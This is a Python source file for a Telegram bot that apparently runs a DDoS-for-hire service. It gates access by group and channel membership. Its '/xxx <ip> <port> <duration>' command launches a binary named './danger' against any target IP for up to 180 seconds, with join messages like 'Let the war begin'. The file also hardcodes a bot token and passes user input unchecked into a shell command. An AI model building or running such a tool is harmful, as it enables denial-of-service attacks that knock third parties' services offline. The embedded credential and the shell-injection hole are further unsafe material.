import os
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ChatJoinRequest
from telegram.ext import Application, CommandHandler, CallbackContext, ChatJoinRequestHandler
from telegram.error import BadRequest
from telegram.constants import ChatMemberStatus

# Replace with your bot token
TELEGRAM_BOT_TOKEN = '7424238580:AAEzWYhZx9VslXvGoZ5yaGxfsbU7icfrGL4'  # Replace with your actual bot token

# Predefined list of authorized group IDs
AUTHORIZED_GROUPS = {-1002399990268}  # Add your group IDs here

# Channel details
CHANNEL_ID = -1002446808386  # Replace with your channel's numeric ID
CHANNEL_LINK = "https://t.me/DARKXCRACKS"  # Replace with your channel's link

# Track active attacks (maximum 2 concurrent attacks)
active_attacks = []

# Blocked ports list
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}  # Add blocked ports here

# Check if the group is authorized
def is_group_authorized(chat_id):
    return chat_id in AUTHORIZED_GROUPS

# Background function to check if the user is a member of the channel
async def is_user_in_channel(user_id, context: CallbackContext):
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR)
    except BadRequest:
        return False

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check group authorization
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ This group is not authorized to use this bot.")
        return

    # Check if user is in the channel
    if not await is_user_in_channel(user_id, context):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("JOIN", url=CHANNEL_LINK)]
        ])
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You are not a member of our channel. Please join to use this bot.",
            reply_markup=keyboard
        )
        return

    message = (
        "*😉 Welcome to DDOS GROUP*\n\n"
        "*Use /xxx <ip> <port> <duration>*\n"
        "*Let the war begin! 💀*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command: Run Attack
async def run_attack(chat_id, ip, port, duration, context, attack_id):
    global active_attacks
    try:
        process = await asyncio.create_subprocess_shell(
            f"./danger {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        active_attacks.remove(attack_id)  # Remove attack from active list
        await context.bot.send_message(chat_id=chat_id, text="*Attack Completed! Thanks for using our services.*", parse_mode='Markdown')

# Command: Xxx
async def xxx(update: Update, context: CallbackContext):
    global active_xxxs
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check group authorization
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ This group is not authorized to use this bot.")
        return

    # Check if user is in the channel
    if not await is_user_in_channel(user_id, context):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("JOIN", url=CHANNEL_LINK)]
        ])
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You are not a member of our channel. Please join to use this bot.",
            reply_markup=keyboard
        )
        return

    if len(active_attacks) >= 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Too many xxxs running. Try again later.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Use: /xxx <ip> <port> <duration>", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Check if the port is blocked
    try:
        port = int(port)
        if port in BLOCKED_PORTS:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Port {port} is blocked. Please choose a valid port.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid port. Please enter a number.", parse_mode='Markdown')
        return

    try:
        duration = int(duration)
        if duration > 180:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ Maximum duration is 180 seconds.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid duration. Please enter a number.", parse_mode='Markdown')
        return

    # Track the new xxx
    attack_id = f"{ip}:{port}:{duration}"
    active_attacks.append(attack_id)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*💀 Xxx Launched!*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battle begin! 🔥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, attack_id))

# Automatically approve join requests and thank the user
async def auto_approve_join_request(update: Update, context: CallbackContext):
    join_request: ChatJoinRequest = update.chat_join_request
    try:
        await context.bot.approve_chat_join_request(chat_id=join_request.chat.id, user_id=join_request.from_user.id)
        await context.bot.send_message(chat_id=join_request.from_user.id, text=(
            "*👌 Request approved 💀*\n"
            "*😉 Welcome to DDOS GROUP*\n\n"
            "*Use /xxx <ip> <port> <duration>*\n"
            "*Let the war begin! 💀*"
        ), parse_mode='Markdown')
        print(f"Approved and thanked user {join_request.from_user.id}")
    except Exception as e:
        print(f"Error approving join request: {e}")

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("xxx", xxx))
    application.add_handler(ChatJoinRequestHandler(auto_approve_join_request))  # Handler for join requests

    application.run_polling()

if __name__ == '__main__':
    main()
